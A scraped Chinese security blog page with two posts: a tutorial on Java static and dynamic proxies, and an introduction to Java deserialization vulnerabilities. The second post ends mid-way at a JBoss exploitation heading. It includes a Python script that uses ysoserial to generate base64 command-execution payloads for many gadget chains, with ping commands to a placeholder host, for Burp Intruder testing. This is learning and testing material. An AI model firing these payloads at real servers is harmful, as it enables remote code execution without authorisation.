</div><hr style="height:1px;margin:1rem 0"><div class="level is-mobile is-flex"><div class="article-tags is-size-7 is-uppercase"><i class="fas fa-tags has-text-grey"></i> <a class="link-muted" rel="tag" href="/tags/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">java反序列化 </a></div></div></article></div><div class="card"><article class="card-content article" role="article"><h1 class="title is-size-3 is-size-4-mobile has-text-weight-normal"><a class="has-link-black-ter" href="/2020/09/13/WEB/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0%E5%AE%9E%E8%B7%B5%E4%B8%89-%E7%90%86%E8%A7%A3java%E7%9A%84%E5%8A%A8%E6%80%81%E4%BB%A3%E7%90%86%E6%9C%BA%E5%88%B6/"><i class="fas fa-angle-double-right"></i>Java反序列化漏洞学习实践三-理解java的动态代理机制</a></h1><div class="article-meta size-small is-uppercase level is-mobile"><div class="level-left"><span class="level-item"><i class="far fa-calendar-alt"> </i><time dateTime="${date_xml(page.date)}" title="${date_xml(page.date)}">2020-09-13</time></span><span class="level-item">Updated&nbsp;<time dateTime="2020-12-29T11:35:19.126Z" title="2020-12-29T11:35:19.126Z">2020-12-29</time></span><span class="level-item is-hidden-mobile"><i class="far fa-calendar-check"> </i><time dateTime="${date_xml(page.updated)}" title="${date_xml(page.updated)}">2020-12-29</time></span><span class="level-item"><a class="link-muted" href="/categories/WEB%E5%AE%89%E5%85%A8/">WEB安全</a></span><span class="level-item">14 minutes read (About 2062 words)</span></div></div><h1 class="title is-3 is-size-4-mobile"><a class="link-muted" href="/2020/09/13/WEB/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0%E5%AE%9E%E8%B7%B5%E4%B8%89-%E7%90%86%E8%A7%A3java%E7%9A%84%E5%8A%A8%E6%80%81%E4%BB%A3%E7%90%86%E6%9C%BA%E5%88%B6/">Java反序列化漏洞学习实践三-理解java的动态代理机制</a></h1><div class="content"><h3 id="0x0、基础"><a href="#0x0、基础" class="headerlink" title="0x0、基础"></a><strong>0x0、基础</strong></h3><p>代理的使用场景：某程序员入职公司接手了一个项目，他读源码发现某些地方可以增强，比如在某些函数执行前应该打印日志。如果他直接在原始代码的基础上直接修改容易出错，他的做法是：自己实现一个类，和原始类实现相同的接口（或者继承相同的类），通过在方法中引用老程序的方法来实现自己的方法，从而实现在不改动源代码的基础上达到增强方法的目的。</p>
<p>代理模式：为其他对象提供一种代理以便控制对这个对象的访问（所谓控制，就是可以在其调用行为前后分别加入一些操作）。</p>
<p>代理模式分类：</p>
<ol>
<li>静态代理，其实质是类的继承或接口的实现，比较容易理解，注意结合场景。</li>
<li><strong>动态代理（Jdk动态代理），这是我们需要关注的重点，在反序列化漏洞的场景中需要用到！</strong></li>
<li>cglib动态代理</li>
</ol>
<h3 id="0x1、静态代理demo和理解"><a href="#0x1、静态代理demo和理解" class="headerlink" title="0x1、静态代理demo和理解"></a><strong>0x1、静态代理demo和理解</strong></h3><p>``</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line">&lt;code&gt;&lt;strong&gt;package 反序列化3;</span><br><span class="line"></span><br><span class="line">&#x2F;*</span><br><span class="line"> * 代理模式的简单demo，静态代理</span><br><span class="line"> * </span><br><span class="line"> * 代理的使用场景：某程序员入职公司接手了一个项目，他读源码发现某些地方可以增强（比如在某些函数执行前应该打印日志）。</span><br><span class="line"> * 如果他直接在原始代码的基础上直接修改容易出错，他的做法是：自己实现一个类，和原始类实现相同的接口（或者继承相同的类），</span><br><span class="line"> * 通过在方法中引用老程序的方法来实现自己的方法，从而实现增强方法的目的。</span><br><span class="line"> *&#x2F;</span><br><span class="line"></span><br><span class="line">public class proxyTest &#123;</span><br><span class="line">	  public static void main(String[] args) &#123;</span><br><span class="line">	        &#x2F;&#x2F;Subject sub &#x3D; new RealSubject();&#x2F;&#x2F;场景中得旧代码，老程序员写的。</span><br><span class="line">	        Subject sub &#x3D; new ProxySubject();&#x2F;&#x2F;新入职的程序员，自己实现了ProxySubject类，然后改成了这句。来增强老程序的代码。</span><br><span class="line">	        sub.request();</span><br><span class="line">	    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">abstract class Subject&#x2F;&#x2F;也可以是接口interface</span><br><span class="line">&#123;&#x2F;&#x2F;抽象角色：通过接口或抽象类声明真实角色实现的业务方法。</span><br><span class="line">    &#x2F;&#x2F;类比网络代理，比如http代理，都支持http协议</span><br><span class="line">    abstract void request();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class RealSubject extends Subject</span><br><span class="line">&#123;&#x2F;&#x2F;真实角色：实现抽象角色，定义真实角色所要实现的业务逻辑，供代理角色调用。</span><br><span class="line">    &#x2F;&#x2F;类比真实的http请求</span><br><span class="line">       public RealSubject()&#x2F;&#x2F;默认构造方法</span><br><span class="line">       &#123;</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">       @Override</span><br><span class="line">       public void request()</span><br><span class="line">       &#123;</span><br><span class="line">              System.out.println(&quot;From real subject.&quot;);</span><br><span class="line">       &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class ProxySubject extends Subject&#x2F;&#x2F;关键是类的继承。</span><br><span class="line">&#123;&#x2F;&#x2F;代理角色：实现抽象角色，是真实角色的代理，通过真实角色的业务逻辑方法来实现抽象方法，并可以附加自己的操作。</span><br><span class="line">    &#x2F;&#x2F;类比通过代理发出http请求，这个代理当然可以对http请求做出任何想要的修改。</span><br><span class="line">    private RealSubject realSubject; &#x2F;&#x2F;以真实角色作为代理角色的属性</span><br><span class="line"></span><br><span class="line">       public ProxySubject()</span><br><span class="line">       &#123;</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">       @Override</span><br><span class="line">       public void request() &#x2F;&#x2F;该方法封装了真实对象的request方法，老程序员的方法。</span><br><span class="line">       &#123;&#x2F;&#x2F;所谓的“控制”就体现在这里</span><br><span class="line">        preRequest(); </span><br><span class="line">        if( realSubject &#x3D;&#x3D; null )</span><br><span class="line">        &#123;</span><br><span class="line">            realSubject &#x3D; new RealSubject();</span><br><span class="line">        &#125;</span><br><span class="line">        realSubject.request(); &#x2F;&#x2F;此处执行真实对象的request方法</span><br><span class="line">        postRequest();</span><br><span class="line">       &#125;</span><br><span class="line">       private void preRequest()</span><br><span class="line">       &#123;</span><br><span class="line">           &#x2F;&#x2F;在请求前做某些处理，比如打印日志，修改请求包等等</span><br><span class="line">           System.out.println(&quot;Do something before requesting: print log,change request&quot;);</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">       private void postRequest()</span><br><span class="line">       &#123;</span><br><span class="line">           &#x2F;&#x2F;在请求后做某些处理，打印日志</span><br><span class="line">           System.out.println(&quot;Do something after requesting: print log&quot;);</span><br><span class="line">       &#125;</span><br><span class="line">   &#125;﻿&lt;&#x2F;strong&gt;&lt;&#x2F;code&gt;</span><br><span class="line">**运行演示：**</span><br></pre></td></tr></table></figure>



<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">**![img](https:&#x2F;&#x2F;leanote.com&#x2F;api&#x2F;file&#x2F;getImage?fileId&#x3D;5f350ee4ab644158a9000a0d)**</span><br></pre></td></tr></table></figure>



<h3 id="0x2、动态代理demo及理解"><a href="#0x2、动态代理demo及理解" class="headerlink" title="0x2、动态代理demo及理解"></a><strong>0x2、动态代理demo及理解</strong></h3><p>但是静态代理这个模式本身有个大问题，如果类方法数量越来越多的时候，代理类的代码量是十分庞大的。比如为老程序员的所有代码都加上日志打印，难道老程序员实现过的所有类，新程序员都需要再实现一遍吗？</p>
<p>所以引入动态代理来解决此类问题。JDK内置的Proxy动态代理可以在运行时动态生成字节码，而没必要针对每个类编写代理类。他只需实现一个InvocationHandler就可以了。</p>
<p>在java的动态代理机制中，有两个重要的类或接口：一个是 InvocationHandler(Interface)；另一个则是 Proxy(Class)，这一个类和接口是实现我们动态代理所必须用到的。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><span class="line">package 反序列化3;</span><br><span class="line"></span><br><span class="line">import java.lang.reflect.InvocationHandler;</span><br><span class="line">import java.lang.reflect.Method;</span><br><span class="line">import java.lang.reflect.Proxy;</span><br><span class="line"></span><br><span class="line">&#x2F;*</span><br><span class="line"> * 动态代理的简单demo，动态代理利用了反射机制</span><br><span class="line"> * 每一个动态代理类都会有一个与之关联的invocation handler。真正的调用是在invocation handler的invoke()方法里完成的。</span><br><span class="line"> * 感谢蝶离飞、廖新喜2位师傅的指导</span><br><span class="line"> *&#x2F;</span><br><span class="line"></span><br><span class="line">public class proxyTest2&#123;</span><br><span class="line">    public static void main(String[] args) &#123;</span><br><span class="line">        DynamicSubject sub&#x3D;new RealDynamicSubject();&#x2F;&#x2F;之前这里sub的类型是RealDynamicSubject，不对；但是为什么呢？</span><br><span class="line">        Handler handler &#x3D; new Handler(sub);</span><br><span class="line"></span><br><span class="line">        &#x2F;&#x2F;newProxyInstance(ClassLoader loader,Class&lt;?&gt;[] interfaces,InvocationHandler h)</span><br><span class="line">        &#x2F;&#x2F;CLassLoader loader:指定动态代理类的类加载器,即生成完成后的代理对象的类加载器</span><br><span class="line">        &#x2F;&#x2F;Class&lt;?&gt; interfaces:指定动态代理类需要实现的所有接口，需要被增强的接口列表（数据）</span><br><span class="line">        &#x2F;&#x2F;InvocationHandler h: 指定与动态代理类关联的 InvocationHandler对象，具体的增强逻辑</span><br><span class="line"></span><br><span class="line">        DynamicSubject sub2 &#x3D; (DynamicSubject)Proxy.newProxyInstance(DynamicSubject.class.getClassLoader(), new Class[]&#123;DynamicSubject.class&#125;, handler); </span><br><span class="line"></span><br><span class="line">        DynamicSubject sub3 &#x3D; (DynamicSubject)Proxy.newProxyInstance(DynamicSubject.class.getClassLoader(), sub.getClass().getInterfaces(), handler);</span><br><span class="line"></span><br><span class="line">        DynamicSubject sub4 &#x3D; (DynamicSubject)Proxy.newProxyInstance(DynamicSubject.class.getClassLoader(), RealDynamicSubject.class.getInterfaces(), handler);</span><br><span class="line"></span><br><span class="line">        &#x2F;&#x2F;从上面的调用方法可知，可以对不同的对象使用相同的模式实现来实现其代理，这就是相对静态代理的优势。</span><br><span class="line"></span><br><span class="line">        System.out.println(&quot;sub.getClass() &#x3D; &quot;+sub.getClass());</span><br><span class="line">        System.out.println(&quot;DynamicSubject.class &#x3D; &quot; +DynamicSubject.class);</span><br><span class="line">        System.out.println(new Class[]&#123;DynamicSubject.class&#125;);</span><br><span class="line">        System.out.println(RealDynamicSubject.class.getInterfaces());</span><br><span class="line"></span><br><span class="line">        sub2.request();</span><br><span class="line">        sub3.request();</span><br><span class="line">        sub4.request();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">interface DynamicSubject</span><br><span class="line">&#123;&#x2F;&#x2F;抽象角色：通过接口或抽象类声明真实角色实现的业务方法。注意:动态代理只能是接口，否则代理类转成该类型事会报错</span><br><span class="line">    &#x2F;&#x2F;类比网络代理，比如http代理，都支持http协议</span><br><span class="line">    abstract void request();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class RealDynamicSubject implements DynamicSubject</span><br><span class="line">&#123;&#x2F;&#x2F;真实角色：实现抽象角色，定义真实角色所要实现的业务逻辑，供代理handler处理调用。</span><br><span class="line">    &#x2F;&#x2F;类比真实的http请求</span><br><span class="line">       public RealDynamicSubject()</span><br><span class="line">       &#123;</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">       public void request()</span><br><span class="line">       &#123;</span><br><span class="line">              System.out.println(&quot;From real subject.&quot;);</span><br><span class="line">       &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#x2F;**</span><br><span class="line"> * 处理器</span><br><span class="line"> *&#x2F;</span><br><span class="line">class Handler implements InvocationHandler&#123;</span><br><span class="line">    private Object obj; &#x2F;&#x2F;被代理的对象（也就是老程序员实现的对象），不管对象是什么类型；之前声明成RealDynamicSubject，不应该这么做</span><br><span class="line">    &#x2F;**</span><br><span class="line">     * 所有的流程控制都在invoke方法中</span><br><span class="line">     * proxy：代理类</span><br><span class="line">     * method：正在调用的方法，反射机制调用函数所必须！</span><br><span class="line">     * args：被调用方法的参数列表，反射机制调用函数所必须！</span><br><span class="line">     *&#x2F;</span><br><span class="line">    @Override</span><br><span class="line">    public Object invoke(Object proxy, Method method, Object[] args) throws Throwable &#123;&#x2F;&#x2F;接口必须实现的方法，也是逻辑核心</span><br><span class="line">        System.out.println(&quot;Do something before requesting: print log&quot;);</span><br><span class="line">        Object xxx &#x3D; method.invoke(this.obj, args);&#x2F;&#x2F;通过反射机制调用老程序员的对象代码。</span><br><span class="line">        System.out.println(&quot;Do something after requesting: print log&quot;);</span><br><span class="line">        return xxx;</span><br><span class="line">    &#125;</span><br><span class="line">    public Handler(Object obj) &#123;</span><br><span class="line">        &#x2F;&#x2F;构造函数，把真实角色的实例传递进来,这个代理handler的目的就是增强它，或者说需要调用它来实现主要的功能。</span><br><span class="line">        this.obj &#x3D; obj;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;﻿</span><br></pre></td></tr></table></figure>





<p>运行结果：</p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/getImage-20200913014358963.png" alt="img"></p>
<h3 id="0x3、思考总结"><a href="#0x3、思考总结" class="headerlink" title="0x3、思考总结"></a>0x3、思考总结</h3><p>在后续将要学习的反序列化PoC构造过程中，我们需要用到这个动态代理机制，因为它提供一种【方法之间的跳转，从任意方法到invoke方法的跳转】，是我们将参数入口和代码执行联系起来的关键！</p>
<p>本文代码下载地址：</p>
<p><a target="_blank" rel="noopener" href="https://github.com/bit4woo/Java_deserialize_vuln_lab/tree/master/src/Step3">https://github.com/bit4woo/Java_deserialize_vuln_lab/tree/master/src/Step3</a></p>
<p>参考</p>
<p><a target="_blank" rel="noopener" href="http://www.runoob.com/design-pattern/design-pattern-intro.html">http://www.runoob.com/design-pattern/design-pattern-intro.html</a></p>
<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/xiaoluo501395377/p/3383130.html">https://www.cnblogs.com/xiaoluo501395377/p/3383130.html</a></p>
<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/xiaoxi/p/5961093.html">https://www.cnblogs.com/xiaoxi/p/5961093.html</a></p>
</div><hr style="height:1px;margin:1rem 0"><div class="level is-mobile is-flex"><div class="article-tags is-size-7 is-uppercase"><i class="fas fa-tags has-text-grey"></i> <a class="link-muted" rel="tag" href="/tags/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">java反序列化 </a></div></div></article></div><div class="card"><article class="card-content article" role="article"><h1 class="title is-size-3 is-size-4-mobile has-text-weight-normal"><a class="has-link-black-ter" href="/2020/09/12/WEB/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"><i class="fas fa-angle-double-right"></i>Java反序列化</a></h1><div class="article-meta size-small is-uppercase level is-mobile"><div class="level-left"><span class="level-item"><i class="far fa-calendar-alt"> </i><time dateTime="${date_xml(page.date)}" title="${date_xml(page.date)}">2020-09-12</time></span><span class="level-item">Updated&nbsp;<time dateTime="2020-12-29T11:35:25.743Z" title="2020-12-29T11:35:25.743Z">2020-12-29</time></span><span class="level-item is-hidden-mobile"><i class="far fa-calendar-check"> </i><time dateTime="${date_xml(page.updated)}" title="${date_xml(page.updated)}">2020-12-29</time></span><span class="level-item"><a class="link-muted" href="/categories/WEB%E5%AE%89%E5%85%A8/">WEB安全</a></span><span class="level-item">7 minutes read (About 1049 words)</span></div></div><h1 class="title is-3 is-size-4-mobile"><a class="link-muted" href="/2020/09/12/WEB/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">Java反序列化</a></h1><div class="content"><h1 id="Java反序列化"><a href="#Java反序列化" class="headerlink" title="﻿Java反序列化"></a>﻿Java反序列化</h1><h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><p>Java反序列化漏洞最早是2015年年初AppSecCali会议上提出了漏洞利用思路，在2015年11月FoxGlove Security 安全团队才真实利用Java反序列化和Apache Commons Collections这一基础类库实现远程命令执行的，这个漏洞直接 可以攻击WebLogic、WebSphere、JBoss、Jenkins、OpenNMS的最新版，在当时被称为是”2015年最被低估的漏洞”。</p>
<p>Apache Commons Collections是一个扩展了Java标准库里的Collection结构的第三方基础库，它提供了很多强有 力的数据结构类型并且实现了各种集合工具类。包括FileUpload、Betwixt、Commons Code、Commons Compress、 Commons CSV等开源工具(下面是JAVA COLLECTION 的介绍)。</p>
<p><strong>Java Collection</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">JAVACOLLECION是java的集合类，用于存储对象，而且长度可变，可存储不同类型的对象。JAVACOLLECTION不同的容器对数据</span><br><span class="line">    的存储方式不同，即数据结构不同。JAVA集合的体系框架:</span><br><span class="line"></span><br><span class="line">collection(接口,最基本的集合)实现接口的类，集合类:</span><br><span class="line"></span><br><span class="line">set</span><br><span class="line"></span><br><span class="line">HashSet&#x2F;TreeSet...</span><br><span class="line"></span><br><span class="line">list</span><br><span class="line"></span><br><span class="line">ArrayList&#x2F;LinkedList...</span><br><span class="line"></span><br><span class="line">map</span><br><span class="line"></span><br><span class="line">vector</span><br></pre></td></tr></table></figure>

<h2 id="Java反序列化概念"><a href="#Java反序列化概念" class="headerlink" title="Java反序列化概念"></a>Java反序列化概念</h2><p>在Java程序中，序列化是程序将对象转换为字节数组，反序列化即为逆过程，将客户端的字节数据转换成对象。 序列化的目的是将对象转换为可存储或传输的字节数组，实现持久化存储。<br>实际开发代码(部分):</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">public class RedisObjectSerializer implements RedisSerializer&lt;Object&gt; &#123; </span><br><span class="line">    private Converter&lt;Object, byte[]&gt; serializer &#x3D; new SerializingConverter();</span><br><span class="line">    private Converter&lt;byte[], Object&gt; deserializer &#x3D; new DeserializingConverter(); </span><br><span class="line">static final byte[] EMPTY_ARRAY &#x3D; new byte[0];</span><br><span class="line">public Object deserialize(byte[] bytes) &#123; </span><br><span class="line">    if (isEmpty(bytes)) &#123;</span><br><span class="line">        return null; &#125;</span><br><span class="line">    try &#123;</span><br><span class="line">        return deserializer.convert(bytes);</span><br><span class="line">    &#125; catch (Exception ex) &#123;</span><br><span class="line">        throw new SerializationException(&quot;Cannot deserialize&quot;, ex);</span><br><span class="line">    &#125;﻿</span><br><span class="line">&#125;</span><br><span class="line">&#x2F;&#x2F; 序列化方法</span><br><span class="line">&#x2F;&#x2F; 如果Bytes为空，返回null</span><br><span class="line">&#x2F;&#x2F; 否则使用serializer.convert(bytes)为Object</span><br><span class="line">public byte[] serialize(Object object) &#123; </span><br><span class="line">    if (object &#x3D;&#x3D; null) &#123;</span><br><span class="line">        return EMPTY_ARRAY; &#125;</span><br><span class="line">    try &#123;</span><br><span class="line">    return serializer.convert(object);</span><br><span class="line">    &#125; catch (Exception ex) &#123; return EMPTY_ARRAY;</span><br><span class="line">    &#125; &#125;</span><br><span class="line">&#x2F;&#x2F;判断字节数组是否为空</span><br><span class="line">&#x2F;&#x2F;@param data</span><br><span class="line">&#x2F;&#x2F;@return</span><br><span class="line">private boolean isEmpty(byte[] data) &#123; </span><br><span class="line">    return (data &#x3D;&#x3D; null || data.length &#x3D;&#x3D; 0);</span><br><span class="line">    &#125; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="Java反序列化漏洞原理"><a href="#Java反序列化漏洞原理" class="headerlink" title="Java反序列化漏洞原理"></a>Java反序列化漏洞原理</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">间接或直接暴露反序列化API，导致用户操作传入数据，攻击者可以精心构造反序列化对象并执行恶意代码。特点:</span><br><span class="line">1.aced0005是java序列化内容的特征，如果经过base64编码，那么相对应的是rO0AB。</span><br><span class="line">2.数据包中出现&quot;sr类名&quot;</span><br><span class="line">3.某些反序列化数据的content-type为application&#x2F;x-serialization</span><br></pre></td></tr></table></figure>

<h2 id="如何检测Java反序列化"><a href="#如何检测Java反序列化" class="headerlink" title="如何检测Java反序列化"></a>如何检测Java反序列化</h2><h3 id="测试脚本"><a href="#测试脚本" class="headerlink" title="测试脚本"></a>测试脚本</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">import os import base64</span><br><span class="line">payloads &#x3D; [&#39;BeanShell1&#39;, &#39;Clojure&#39;, &#39;CommonsBeanutils1&#39;, &#39;CommonsCollections1&#39;, &#39;CommonsCollections2&#39;, &#39;CommonsCollections3&#39;, &#39;CommonsCollections4&#39;, &#39;CommonsCollections5&#39;, &#39;CommonsCollections6&#39;, &#39;Groovy1&#39;, &#39;Hibernate1&#39;, &#39;Hibernate2&#39;, &#39;JBossInterceptors1&#39;, &#39;JRMPClient&#39;, &#39;JSON1&#39;, &#39;JavassistWeld1&#39;, &#39;Jdk7u21&#39;, &#39;MozillaRhino1&#39;, &#39;Myfaces1&#39;, &#39;ROME&#39;, &#39;Spring1&#39;, &#39;Spring2&#39;]</span><br><span class="line">def generate(name, cmd):</span><br><span class="line">    for payload in payloads:</span><br><span class="line">        final &#x3D; cmd.replace(&#39;REPLACE&#39;, payload)</span><br><span class="line">        print &#39;Generating &#39; + payload + &#39; for &#39; + name + &#39;...&#39;</span><br><span class="line">        command &#x3D; os.popen(&#39;java -jar ysoserial.jar &#39; + payload + &#39; &quot;&#39; + final + &#39;&quot;&#39;) result &#x3D; command.read()</span><br><span class="line">        command.close()</span><br><span class="line">        encoded &#x3D; base64.b64encode(result)</span><br><span class="line">        if encoded !&#x3D; &quot;&quot;:</span><br><span class="line">            open(name + &#39;_intruder.txt&#39;, &#39;a&#39;).write(encoded + &#39;\n&#39;)</span><br><span class="line">generate(&#39;Windows&#39;, &#39;ping -n 1 win.REPLACE.server.local&#39;) </span><br><span class="line">generate(&#39;Linux&#39;, &#39;ping -c 1 nix.REPLACE.server.local&#39;)</span><br></pre></td></tr></table></figure>

<p><strong>将脚本生成的文件加载至Burpsuit进行Intruder，服务器端执行tcpdump icmp查看是否有命令执行成功。</strong></p>
<h2 id="测试工具"><a href="#测试工具" class="headerlink" title="测试工具"></a>测试工具</h2><p><a target="_blank" rel="noopener" href="https://github.com/frohoff/ysoserial">ysoserial </a>是反序列化生成payload的工具。<br><a target="_blank" rel="noopener" href="https://github.com/federicodotta/Java-Deserialization-Scanner">Java-Deserialization-Scanner Burpsuit</a> 插件(Burp Pro 插件商店可直接安装)，识别流量，主动被动探测。</p>
<p><a href="freddy">freddy Burpsuit </a>插件(Burp Pro 插件商店可直接安装)。 </p>
<h2 id="ysoserial工具学习"><a href="#ysoserial工具学习" class="headerlink" title="ysoserial工具学习"></a>ysoserial工具学习</h2><h3 id="java动态代理"><a href="#java动态代理" class="headerlink" title="java动态代理"></a>java动态代理</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">代理委托类和代理类</span><br><span class="line"></span><br><span class="line">静态代理和动态代理静态代理，委托类和代理类同时实现一个接口，两者通过聚合实现，代理类需要有一个委托类的引用。</span><br><span class="line"></span><br><span class="line">动态代理是通过在委托类和代理类之间设置一个中介类，中介类实现InvokeHandler接口，作为调用处理器拦截对代理类方法</span><br><span class="line">    的调用.</span><br><span class="line"></span><br><span class="line">静态代理和动态代理:</span><br></pre></td></tr></table></figure>

<p>参考资料：</p>
<p>[Java Proxy和CGLIB 动态代理原理](Java Proxy 和 CGLIB 动态代理原理 Java动态代理)</p>
<p><a href="Java动态代理">Java 动态代理</a></p>
<h3 id="Java反射机制"><a href="#Java反射机制" class="headerlink" title="Java反射机制"></a>Java反射机制</h3><p>参考资料</p>
<p><a target="_blank" rel="noopener" href="https://www.sczyh30.com/posts/Java/java-reflection-1/">深入解析Java反射（1）-基础</a></p>
<p>Jboss 反序列化漏洞利用实例</p>
<p>确定jboss应用</p>
